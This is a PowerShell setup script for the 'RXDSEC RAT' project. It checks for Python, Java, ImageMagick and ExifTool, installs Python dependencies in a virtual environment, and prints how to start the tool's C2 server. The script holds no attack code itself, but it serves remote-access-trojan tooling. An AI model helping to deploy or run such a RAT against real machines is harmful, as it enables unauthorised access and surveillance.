# PowerShell Installation Script for RXDSEC RAT
# This script installs all required dependencies for the RXDSEC RAT

# Stop on first error
$ErrorActionPreference = "Stop"

function Write-ColorOutput($ForegroundColor) {
    # Save the current color
    $fc = $host.UI.RawUI.ForegroundColor
    
    # Set the new color
    $host.UI.RawUI.ForegroundColor = $ForegroundColor
    
    # Output
    if ($args) {
        Write-Output $args
    }
    else {
        $input | Write-Output
    }
    
    # Restore the original color
    $host.UI.RawUI.ForegroundColor = $fc
}

Write-ColorOutput Green "=== RXDSEC RAT Installation Script ==="
Write-ColorOutput Yellow "This script will install all required dependencies for RXDSEC RAT"
Write-Output ""

# Check if Python 3.9+ is installed
Write-ColorOutput Green "Checking Python version..."
try {
    $pythonVersion = python --version
    if ($pythonVersion -match 'Python (\d+)\.(\d+)\.(\d+)') {
        $major = [int]$Matches[1]
        $minor = [int]$Matches[2]
        
        if ($major -ge 3 -and $minor -ge 9) {
            Write-ColorOutput Green "Python $($Matches[1]).$($Matches[2]) detected. Continuing..."
            $pythonCmd = "python"
        }
        else {
            Write-ColorOutput Red "Python 3.9+ is required. Found $pythonVersion"
            exit 1
        }
    }
}
catch {
    Write-ColorOutput Red "Python not found. Please install Python 3.9 or higher"
    exit 1
}

# Check for system dependencies
Write-ColorOutput Green "Checking system dependencies..."
$missingDeps = @()

# Check for Java
if (-not (Get-Command "java" -ErrorAction SilentlyContinue)) {
    $missingDeps += "Java JDK"
}

# Check for ImageMagick
if (-not (Get-Command "magick" -ErrorAction SilentlyContinue)) {
    $missingDeps += "ImageMagick"
}

# Check for ExifTool
if (-not (Get-Command "exiftool" -ErrorAction SilentlyContinue)) {
    $missingDeps += "ExifTool"
}

if ($missingDeps.Count -gt 0) {
    Write-ColorOutput Yellow "The following system dependencies are missing:"
    foreach ($dep in $missingDeps) {
        Write-ColorOutput Yellow "- $dep"
    }
    Write-ColorOutput Yellow "You should install these manually. See DEPENDENCIES.md for details."
    
    $continue = Read-Host "Do you want to continue with Python dependencies installation? (Y/N)"
    if ($continue -ne "Y" -and $continue -ne "y") {
        exit 0
    }
}
else {
    Write-ColorOutput Green "All system dependencies found!"
}

# Create Python virtual environment
Write-ColorOutput Green "Creating Python virtual environment..."
& $pythonCmd -m venv venv
if (-not $?) {
    Write-ColorOutput Red "Failed to create virtual environment"
    exit 1
}

# Activate virtual environment
Write-ColorOutput Green "Activating virtual environment..."
& .\venv\Scripts\Activate.ps1
if (-not $?) {
    Write-ColorOutput Red "Failed to activate virtual environment"
    exit 1
}

# Upgrade pip
Write-ColorOutput Green "Upgrading pip..."
pip install --upgrade pip
if (-not $?) {
    Write-ColorOutput Red "Failed to upgrade pip"
    exit 1
}

# Install Python dependencies using setup.py
Write-ColorOutput Green "Installing Python dependencies..."
pip install -e .
if (-not $?) {
    Write-ColorOutput Red "Failed to install Python dependencies"
    exit 1
}

# Install development dependencies
Write-ColorOutput Green "Installing development dependencies..."
pip install -e ".[dev]"
if (-not $?) {
    Write-ColorOutput Red "Failed to install development dependencies"
    exit 1
}

Write-Output ""
Write-ColorOutput Green "=== Installation Complete ==="
Write-ColorOutput Green "RXDSEC RAT has been successfully installed!"
Write-Output ""
Write-Output "To start the C2 server:"
Write-ColorOutput Yellow "  1. Activate virtual environment: .\venv\Scripts\Activate.ps1"
Write-ColorOutput Yellow "  2. Start server: cd c2_server; python server.py"
Write-Output ""
Write-Output "For more information, refer to README.md and DEPENDENCIES.md"